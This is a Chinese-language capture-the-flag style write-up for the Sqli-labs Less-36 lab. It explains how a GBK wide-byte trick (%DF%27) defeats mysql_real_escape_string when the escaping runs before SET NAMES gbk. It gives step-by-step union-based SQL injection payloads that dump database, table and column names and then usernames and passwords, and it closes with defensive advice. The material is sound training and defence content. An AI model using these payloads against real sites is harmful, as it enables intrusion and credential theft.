# 题目：Sqli‑labs Less‑36

## 题目描述
页面提示 `Please input the ID as parameter with numeric value`，底部有两条 Hint：一条是 `The Query String you input is escaped as : ...`，另一条是 `The Query String you input in Hex becomes : ...`。标题是 `Less‑36 **Bypass MySQL Real Escape String**`，说明这一关使用 `mysql_real_escape_string()` 进行转义防护。

## 核心原理与前置分析
后台关键PHP代码：
```php
$id = mysql_real_escape_string($_GET['id']);
mysql_query("SET NAMES gbk");
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```
* `mysql_real_escape_string()` 和 `addslashes()` 的最大区别：**它是字符集感知的**，会参考当前数据库连接字符集完成转义。很多人认为它比 `addslashes` 安全，但是当**转义时的字符集和 SQL 执行时的字符集不一致**，防护就可以被绕过。

**漏洞执行流程**
1. PHP 接收到 payload 字节 `0xDF 0x27`（URL 编码：`%DF%27`）；
2. `mysql_real_escape_string()` 执行时，连接尚未切换到 GBK，使用默认字符集将单引号`0x27`转义为`0x5C 0x27`，字节流变为 `0xDF 0x5C 0x27`；
3. 随后执行 `SET NAMES gbk`，MySQL 按照 GBK 解析 SQL，`0xDF 0x5C` 被识别成一个合法 GBK 汉字，反斜杠`0x5C`被消耗；
4. 剩下字节 `0x27`（单引号）被释放，成功闭合 SQL 语句，注入生效。

页面 Hint 的 Hex 回显可以直接观察到该现象：
```text
escaped as : ß\'
Hex becomes : df5c27
```
`df 5c` 组合为 GBK 汉字，`27` 逃逸作为注入单引号

## 解题思路
1. 使用`%DF%27`探测，观察 Hex 回显确认宽字节效果；
2. 使用`or 1=1`验证单引号逃逸成功；
3. `order by` 判断查询列数；
4. `union select` 寻找回显位；
5. 依次爆库、爆表、爆字段、导出数据。

## 解题步骤
### 1. 确认宽字节逃逸效果
```
?id=1%DF%27
```
页面底部 Hint 输出：
```
The Query String you input is escaped as : ß\'
The Query String you input in Hex becomes : df5c27
```
Hex 结果为`df5c27`，反斜杠已经被 GBK 汉字吃掉，单引号逃逸成功。

### 2. 确认注入点有效性
```
?id=%DF%27 or 1=1 %23
```
页面回显 `Your Login name:Dumb`，注入点生效。

### 3. 判断列数
```
?id=-1%DF%27 order by 3 %23
?id=-1%DF%27 order by 4 %23
```
`order by 3` 页面无报错，`order by 4` 抛出错误 `Unknown column '4' in 'order clause'`，得到一共 **3 列**。

### 4. 找回显位
```
?id=-1%DF%27 union select 1,2,3 %23
```
回显
```
Your Login name:2
Your Password:3
```
第 2、3 列为可回显位置。

### 5. 爆库名
```
?id=-1%DF%27 union select 1,database(),3 %23
```
回显
```
Your Login name:security
Your Password:3
```

### 6. 爆表名
```
?id=-1%DF%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23
```
回显
```
Your Login name:emails,referers,uagents,users
```

### 7. 爆字段名
```
?id=-1%DF%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273 %23
```
回显
```
Your Login name:id,username,password
```

### 8. 爆账号密码
```
?id=-1%DF%27 union select 1,group_concat(username,0x3a,password),3 from users %23
```
回显
```
Your Login name:Dumb:Dumb,Angelina:I‑kill‑you,Dummy:p@ssword,secure:crappy,...
Your Password:3
```

## 踩坑记录
1. **不要迷信 mysql_real_escape_string**。该函数拥有字符集感知能力，但本关代码顺序错误，**先转义，后执行 SET NAMES gbk**，转义与执行字符集不一致导致防护失效。
2. `%DF` 需要被 URL 解码为原始字节。直接传入字面字符串`%df`不会解码，无法拼接出 GBK 汉字，注入失败。
3. 单引号仍然会被转义。直接使用`?id=1'`无法注入，必须前置`0xDF`字节用来吃掉转义产生的反斜杠。
4. 联合查询使用`id=-1`。id=1 时原始查询会返回第一条数据，会覆盖 union 查询结果；使用 - 1 让原查询返回空，才能看到 union 的输出。
5. 注释优先使用`#`，URL 编码为`%23`。`--+`依赖`+`解码为空格，`#`兼容性更好更稳定。

## 知识点总结
1. `mysql_real_escape_string`原理：依据**当前数据库连接字符集**做转义，识别多字节字符首字节；安全性完全取决于：转义阶段和 SQL 执行阶段字符集必须保持一致。
2. 宽字节注入本质：转义函数添加反斜杠`0x5C`，GBK 编码中`0xDF 0x5C`组成合法汉字，反斜杠被合法消耗，单引号完成逃逸。
3. 漏洞根因：代码执行顺序错误，先调用转义函数，再执行`SET NAMES gbk`，两套不同字符集造成转义失效。

**防御**: 使用预编译 + 参数绑定；数据库统一采用 utf8mb4 字符集；禁止使用`SET NAMES`手动修改字符集，使用`mysqli_set_charset()`/PDO 属性在连接初期设置字符集；关闭详细报错回显，数据库账号最小权限。
